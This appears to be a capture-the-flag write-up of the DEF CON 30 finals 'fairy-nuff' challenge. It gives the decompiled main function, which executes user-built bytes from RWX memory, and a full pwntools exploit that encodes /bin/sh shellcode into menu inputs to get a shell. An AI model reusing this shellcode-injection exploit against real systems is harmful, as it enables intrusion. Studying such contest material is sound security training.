# defcon finals 30 - speedrun fairy-nuff writeup

I reversed main function

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (*vmmap)(void); // rax
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  __int64 v10; // rbx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rbx
  __int64 v15; // rbx
  __int64 v16; // rbx
  __int64 v17; // rbx
  __int64 v18; // rbx
  __int64 v19; // rbx
  __int64 v20; // rbx
  char input[128]; // [rsp+20h] [rbp-A0h] BYREF
  void (*v22)(void); // [rsp+A0h] [rbp-20h]
  int input_int; // [rsp+A8h] [rbp-18h]
  int counter; // [rsp+ACh] [rbp-14h]

  init();
  puts("I am Fairy Nuff, please help me brew my Magic Essence potion!\n");
  counter = 0;
  while ( 1 )
  {
    puts("What next?");
    puts("1) Stir to the left");
    puts("2) Stir to the right");
    puts("3) Add in a little Starflower");
    puts("4) Grind up some Gorak Claws");
    puts("5) Add some water");
    puts("6) Wait a bit");
    puts("7) It's all done!");
    if ( !fgets(input, 128, stdin) )
      return 0;
    input_int = atoi(input);
    switch ( input_int )
    {
      case 1:
        if ( --counter < 0 )
          counter = 0;
        break;
      case 2:
        if ( ++counter > 255 )
          counter = 0;
        break;
      case 3:
        *(&brew + counter) += 16;
        break;
      case 4:
        *(&brew + counter) += 72;
        break;
      case 5:
        *(&brew + counter) += 12;
        break;
      case 6:
        *(&brew + counter) -= 3;
        break;
      case 7:
        puts("OK, let's try out this potion!");
        vmmap = mmap(0LL, 4096uLL, 7, 34, -1, 0LL);
        v22 = vmmap;
        v5 = qword_4088;
        *vmmap = brew;
        *(vmmap + 1) = v5;
        v6 = qword_4098;
        *(vmmap + 2) = qword_4090;
        *(vmmap + 3) = v6;
        v7 = qword_40A8;
        *(vmmap + 4) = qword_40A0;
        *(vmmap + 5) = v7;
        v8 = qword_40B8;
        *(vmmap + 6) = qword_40B0;
        *(vmmap + 7) = v8;
        v9 = qword_40C8;
        *(vmmap + 8) = qword_40C0;
        *(vmmap + 9) = v9;
        v10 = qword_40D8;
        *(vmmap + 10) = qword_40D0;
        *(vmmap + 11) = v10;
        v11 = qword_40E8;
        *(vmmap + 12) = qword_40E0;
        *(vmmap + 13) = v11;
        v12 = qword_40F8;
        *(vmmap + 14) = qword_40F0;
        *(vmmap + 15) = v12;
        v13 = qword_4108;
        *(vmmap + 16) = qword_4100;
        *(vmmap + 17) = v13;
        v14 = qword_4118;
        *(vmmap + 18) = qword_4110;
        *(vmmap + 19) = v14;
        v15 = qword_4128;
        *(vmmap + 20) = qword_4120;
        *(vmmap + 21) = v15;
        v16 = qword_4138;
        *(vmmap + 22) = qword_4130;
        *(vmmap + 23) = v16;
        v17 = qword_4148;
        *(vmmap + 24) = qword_4140;
        *(vmmap + 25) = v17;
        v18 = qword_4158;
        *(vmmap + 26) = qword_4150;
        *(vmmap + 27) = v18;
        v19 = qword_4168;
        *(vmmap + 28) = qword_4160;
        *(vmmap + 29) = v19;
        v20 = qword_4178;
        *(vmmap + 30) = qword_4170;
        *(vmmap + 31) = v20;
        v22();
        break;
      default:
        continue;
    }
  }
}
```

in above code we could see the program gets some bytes from input and save in the mmap which itself is made.
in below code we could see which it will save which bytes.

```c
      case 3:
        *(&brew + counter) += 16;
        break;
      case 4:
        *(&brew + counter) += 72;
        break;
      case 5:
        *(&brew + counter) += 12;
        break;
      case 6:
        *(&brew + counter) -= 3;
        break;
```
so we wrote a shell code and with calculating the bytes of the shell code save it in the memory and when we send '7' the program will run it.


here is the exploit

```python
from pwn import *

local = True
fileName = './challenge'
e = ELF(fileName)

if local:
    p = process(fileName)
    # gdb.attach(p,'''
    #     b *main
    # ''')
else:
    p = remote('',)



context.arch = 'amd64'
shell = asm(shellcraft.amd64.linux.sh())
for byte in shell:
    while byte > 0:
        if byte >= 72:
            p.sendlineafter('all done!','4')
            byte -= 72
        elif byte >= 16:
            p.sendlineafter('all done!','3')
            byte -= 16
        elif byte >= 12:
            p.sendlineafter('all done!','5')
            byte -= 12
        else:
            p.sendlineafter('all done!','3')
            p.sendlineafter('all done!','6')
            p.sendlineafter('all done!','6')
            p.sendlineafter('all done!','6')
            p.sendlineafter('all done!','6')
            p.sendlineafter('all done!','6')
            byte -= 1

    p.sendlineafter('all done!','2')

p.sendlineafter('all done!','7')
p.interactive()
```


## yes we got the shell.
